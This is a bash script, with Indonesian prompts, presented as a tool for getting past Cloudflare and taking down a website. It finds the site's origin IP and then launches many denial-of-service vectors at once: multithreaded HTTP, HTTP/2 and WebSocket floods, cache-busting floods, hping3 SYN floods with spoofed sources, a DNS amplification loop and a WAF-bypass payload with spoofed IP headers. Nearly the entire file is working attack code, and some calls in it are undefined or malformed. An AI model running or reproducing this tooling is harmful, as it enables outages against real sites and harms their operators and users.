#!/bin/bash
# CF Bypass Death Ray - CloudFlare Penetrator
# By: Ibu (Ex-Black Hat Master)

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

banner() {
    clear
    echo -e "${RED}"
    echo "██████╗███████╗     ██████╗██╗  ██╗███████╗ █████╗ ████████╗██╗  ██╗"
    echo "██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██║  ██║"
    echo "██║     █████╗      ██║     ███████║█████╗  ███████║   ██║   ███████║"
    echo "██║     ██╔══╝      ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██╔══██║"
    echo "╚██████╗██║         ╚██████╗██║  ██║███████╗██║  ██║   ██║   ██║  ██║"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}           CLOUDFLARE BYPASS & DESTROY ENGINE v3.0${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
}

install_heavy_deps() {
    echo -e "${YELLOW}[*] Menginstall dependencies berat...${NC}"
    
    # Update system
    apt-get update -y
    apt-get upgrade -y
    
    # Install basic tools
    apt-get install -y curl wget git make cmake gcc g++ python3 python3-pip \
        perl nmap masscan hping3 slowhttptest siege apache2-utils \
        dnsutils tor proxychains4 netcat-openbsd socat \
        openvpn stunnel4 haproxy nginx \
        nodejs npm php php-curl php-sockets
    
    # Install Python libraries
    pip3 install --upgrade pip
    pip3 install requests scapy pyshark colorama asyncio aiohttp \
        beautifulsoup4 selenium cloudscraper cfscrape pycurl \
        fake-useragent python-whois dnspython concurrent-log-handler \
        httpx http2 pyproxy twisted pyOpenSSL pycryptodome
    
    # Install Node.js tools
    npm install -g puppeteer playwright cloudflare-bypasser \
        http-flood slowloris golden-eye
    
    echo -e "${GREEN}[✓] Dependencies terinstall${NC}"
}

find_real_ip() {
    target=$1
    domain=$(echo $target | sed 's|https\?://||' | cut -d'/' -f1)
    
    echo -e "${BLUE}[+] Mencari IP asli $domain...${NC}"
    
    # Method 1: Historical DNS data
    echo -e "${YELLOW}[*] Cek historical DNS...${NC}"
    curl -s "https://securitytrails.com/domain/$domain/dns" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u >> /tmp/ips.txt
    
    # Method 2: Subdomain enumeration
    echo -e "${YELLOW}[*] Subdomain enumeration...${NC}"
    for sub in $(curl -s "https://crt.sh/?q=%25$domain&output=json" | grep -oP '(?<="name_value":")[^"]*' | sort -u); do
        host $sub 2>/dev/null | grep "has address" | awk '{print $4}' >> /tmp/ips.txt
    done
    
    # Method 3: SSL certificate logs
    echo -e "${YELLOW}[*] Cek SSL certificates...${NC}"
    curl -s "https://crt.sh/?q=$domain&output=json" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> /tmp/ips.txt
    
    # Method 4: DNS brute force
    echo -e "${YELLOW}[*] DNS brute force...${NC}"
    for dns in 8.8.8.8 1.1.1.1 9.9.9.9; do
        dig @$dns $domain A +short >> /tmp/ips.txt
    done
    
    # Method 5: TXT records
    echo -e "${YELLOW}[*] Cek TXT records...${NC}"
    dig $domain TXT +short | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> /tmp/ips.txt
    
    # Method 6: NS lookup
    echo -e "${YELLOW}[*] NS lookup...${NC}"
    nslookup $domain | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> /tmp/ips.txt
    
    # Method 7: Scan open ports for origin server
    echo -e "${YELLOW}[*] Scan origin server...${NC}"
    masscan -p80,443,8080,8443 --rate 10000 --wait 0 --open-only $(curl -s ifconfig.me)/24 2>/dev/null | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> /tmp/ips.txt
    
    # Clean and sort IPs
    cat /tmp/ips.txt | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /tmp/real_ips.txt
    
    # Test each IP
    while read ip; do
        if curl -s -H "Host: $domain" http://$ip -I | grep -q "200\|301\|302"; then
            echo -e "${GREEN}[✓] REAL IP FOUND: $ip${NC}"
            echo $ip >> /tmp/confirmed_ips.txt
        fi
    done < /tmp/real_ips.txt
    
    if [ -f /tmp/confirmed_ips.txt ]; then
        real_ip=$(head -1 /tmp/confirmed_ips.txt)
        echo -e "${GREEN}[✓] IP asli: $real_ip${NC}"
        return 0
    else
        echo -e "${RED}[✗] IP asli tidak ditemukan, lanjut dengan metode lain${NC}"
        return 1
    fi
}

bypass_cf_javascript() {
    target=$1
    
    echo -e "${BLUE}[+] Bypass CF JavaScript challenge...${NC}"
    
    # Method 1: Cloudscraper
    python3 -c "
import cloudscraper
import threading
import time

scraper = cloudscraper.create_scraper(
    interpreter='js2py',
    delay=0.1
)

def attack():
    url = '$target'
    while True:
        try:
            scraper.get(url, timeout=5)
            scraper.post(url, data={'rand': str(time.time())})
        except:
            pass

for i in range(100):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()
    time.sleep(0.1)

while True:
    time.sleep(1)
" 2>/dev/null &
}

bypass_cf_waf() {
    target=$1
    
    echo -e "${BLUE}[+] Bypass CF WAF rules...${NC}"
    
    # Payload bypass WAF
    python3 -c "
import requests
import threading
import random

url = '$target'

headers_list = [
    {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
    {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
    {'User-Agent': 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'},
    {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36'}
]

def attack():
    while True:
        headers = random.choice(headers_list)
        headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        headers['X-Real-IP'] = headers['X-Forwarded-For']
        headers['CF-Connecting-IP'] = headers['X-Forwarded-For']
        headers['X-Originating-IP'] = headers['X-Forwarded-For']
        headers['X-Remote-IP'] = headers['X-Forwarded-For']
        headers['X-Remote-Addr'] = headers['X-Forwarded-For']
        
        try:
            requests.get(url, headers=headers, timeout=3)
            requests.post(url, headers=headers, data={'waf_bypass': '/*!50000select*/ 1'}, timeout=3)
        except:
            pass

for i in range(200):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

while True:
    pass
" 2>/dev/null &
}

http2_flood() {
    target=$1
    
    echo -e "${BLUE}[+] HTTP/2 Rapid Reset Flood...${NC}"
    
    python3 -c "
import httpx
import asyncio
import threading

url = '$target'

async def http2_flood():
    async with httpx.AsyncClient(http2=True) as client:
        while True:
            tasks = []
            for i in range(100):
                tasks.append(client.get(url))
                tasks.append(client.post(url, json={'data': i}))
            await asyncio.gather(*tasks, return_exceptions=True)

def run_async():
    asyncio.run(http2_flood())

for i in range(50):
    t = threading.Thread(target=run_async)
    t.daemon = True
    t.start()

while True:
    pass
" 2>/dev/null &
}

websocket_flood() {
    target=$1
    
    echo -e "${BLUE}[+] WebSocket Connection Flood...${NC}"
    
    python3 -c "
import asyncio
import websockets
import threading

uri = '$target'.replace('http', 'ws')

async def ws_flood():
    while True:
        try:
            async with websockets.connect(uri) as ws:
                for i in range(1000):
                    await ws.send('ping' * 1000)
                    await ws.recv()
        except:
            pass

def run_ws():
    asyncio.run(ws_flood())

for i in range(100):
    t = threading.Thread(target=run_ws)
    t.daemon = True
    t.start()

while True:
    pass
" 2>/dev/null &
}

cf_sslv2_bypass() {
    target_ip=$1
    target_domain=$2
    
    echo -e "${BLUE}[+] SSLv2 Bypass Attack...${NC}"
    
    # Exploit SSL/TLS handshake
    while true; do
        openssl s_client -connect $target_ip:443 -servername $target_domain -ssl2 -reconnect 2>/dev/null &
        openssl s_client -connect $target_ip:443 -servername $target_domain -ssl3 -reconnect 2>/dev/null &
        sleep 0.1
    done
}

cf_origin_bypass() {
    target_ip=$1
    target_domain=$2
    
    echo -e "${BLUE}[+] Origin Server Direct Attack...${NC}"
    
    # Attack origin IP directly
    while true; do
        # HTTP direct
        curl -s -H "Host: $target_domain" http://$target_ip -o /dev/null &
        curl -s -H "Host: $target_domain" https://$target_ip -k -o /dev/null &
        
        # HTTPS direct with SNI
        for port in 80 443 8080 8443 8888 9443; do
            hping3 -S -p $port --flood $target_ip --rand-source &
        done
        
        sleep 0.05
    done
}

cf_cache_buster() {
    target=$1
    
    echo -e "${BLUE}[+] Cache Buster Attack...${NC}"
    
    # Bypass cache with random parameters
    python3 -c "
import requests
import threading
import random
import time

url = '$target'

paths = [
    '/', '/index.php', '/index.html', '/index.aspx', '/wp-admin',
    '/wp-content', '/api/v1', '/api/v2', '/graphql', '/rest',
    '/products', '/product', '/category', '/shop', '/cart',
    '/checkout', '/account', '/login', '/register', '/contact'
]

def cache_buster():
    session = requests.Session()
    while True:
        for path in paths:
            cache_buster = f'?cb={random.randint(1,999999999)}&t={time.time()}'
            try:
                session.get(url + path + cache_buster, timeout=2)
                session.post(url + path, data={'cache': 'buster'}, timeout=2)
            except:
                pass

for i in range(150):
    t = threading.Thread(target=cache_buster)
    t.daemon = True
    t.start()

while True:
    time.sleep(0.1)
" 2>/dev/null &
}

proxy_rotation() {
    echo -e "${BLUE}[+] Proxy Rotator Active...${NC}"
    
    # Get fresh proxies
    while true; do
        curl -s "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all" > /tmp/proxies.txt
        curl -s "https://www.proxy-list.download/api/v1/get?type=http" >> /tmp/proxies.txt
        curl -s "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt" >> /tmp/proxies.txt
        
        sleep 300  # Update every 5 minutes
    done
}

browser_emulation() {
    target=$1
    
    echo -e "${BLUE}[+] Browser Emulation Attack...${NC}"
    
    # Puppeteer emulation
    node -e "
const puppeteer = require('puppeteer');
const cluster = require('cluster');

async function launchBrowser() {
    const browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-web-security']
    });
    
    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    while (true) {
        try {
            await page.goto('$target', { waitUntil: 'networkidle0', timeout: 5000 });
            await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
            await page.waitForTimeout(1000);
            await page.goto('$target' + '?' + Math.random(), { timeout: 5000 });
        } catch(e) {}
    }
}

for (let i = 0; i < 50; i++) {
    launchBrowser();
}
" 2>/dev/null &
}

ultimate_cf_death() {
    target=$1
    domain=$(echo $target | sed 's|https\?://||' | cut -d'/' -f1)
    
    echo -e "${PURPLE}╔════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║        ULTIMATE CLOUDFLARE DEATH SEQUENCE        ║${NC}"
    echo -e "${PURPLE}╚════════════════════════════════════════════════════╝${NC}"
    
    # Step 1: Find real IP
    find_real_ip $target
    
    # Step 2: Start proxy rotation
    proxy_rotation &
    
    # Step 3: Launch all bypass methods
    if [ -f /tmp/confirmed_ips.txt ]; then
        while read real_ip; do
            echo -e "${GREEN}[+] Attacking origin: $real_ip${NC}"
            cf_origin_bypass $real_ip $domain &
        done < /tmp/confirmed_ips.txt
    fi
    
    # Step 4: Launch CF bypass attacks
    bypass_cf_javascript "$target" &
    bypass_cf_waf "$target" &
    http2_flood "$target" &
    websocket_flood "$target" &
    cf_cache_buster "$target" &
    browser_emulation "$target" &
    
    # Step 5: SSL/TLS exploitation
    for ip in $(cat /tmp/confirmed_ips.txt 2>/dev/null); do
        cf_sslv2_bypass $ip $domain &
    done
    
    # Step 6: DNS amplification through CF
    python3 -c "
import socket
import random
import threading
import time

target = '$domain'

def dns_amp():
    servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
    while True:
        for server in servers:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = b'\\xdb\\x42\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01' + \
                   target.encode() + b'\\x00\\x00\\xff\\x00\\x01\\x00\\x00)\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
            sock.sendto(query, (server, 53))

for i in range(100):
    t = threading.Thread(target=dns_amp)
    t.daemon = True
    t.start()
" 2>/dev/null &
    
    echo -e "${GREEN}[✓] SEMUA BYPASS METHOD AKTIF${NC}"
    echo -e "${YELLOW}[!] Target: $domain akan tumbang dalam hitungan detik${NC}"
}

monitor_cf_bypass() {
    target=$1
    
    echo -e "${BLUE}[+] Monitoring bypass progress...${NC}"
    
    while true; do
        # Check if CF blocking is weakening
        response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 "$target")
        
        case $response in
            200|301|302)
                echo -e "${GREEN}[✓] BYPASS SUKSES! HTTP $response${NC}"
                ;;
            403|503)
                echo -e "${YELLOW}[!] Still blocked by CF...${NC}"
                ;;
            *)
                echo -e "${RED}[?] Unknown response: $response${NC}"
                ;;
        esac
        
        sleep 5
    done
}

main() {
    banner
    install_heavy_deps
    
    echo -e "${CYAN}════════════════════════════════════════════${NC}"
    echo -e "${GREEN}Masukkan target website (dengan http/https):${NC} "
    read target
    
    echo ""
    echo -e "${GREEN}Pilih mode serangan:${NC}"
    echo "1. CF JavaScript Bypass + Flood"
    echo "2. Origin IP Finder + Direct Attack"
    echo "3. HTTP/2 Rapid Reset"
    echo "4. WAF Bypass + Payload Injection"
    echo "5. Browser Emulation Attack"
    echo "6. MULTI-VECTOR BYPASS (REKOMENDASI)"
    echo -n "Pilih [1-6]: "
    read mode
    
    case $mode in
        1)
            bypass_cf_javascript "$target"
            http_flood "$target" 1000 3600
            ;;
        2)
            find_real_ip "$target"
            if [ -f /tmp/confirmed_ips.txt ]; then
                domain=$(echo $target | sed 's|https\?://||' | cut -d'/' -f1)
                while read ip; do
                    cf_origin_bypass $ip $domain
                done < /tmp/confirmed_ips.txt
            fi
            ;;
        3)
            http2_flood "$target"
            ;;
        4)
            bypass_cf_waf "$target"
            ;;
        5)
            browser_emulation "$target"
            ;;
        6)
            ultimate_cf_death "$target"
            monitor_cf_bypass "$target" &
            ;;
    esac
    
    echo -e "${RED}[!] Attack running - Tekan CTRL+C untuk stop${NC}"
    wait
}

# Run
main
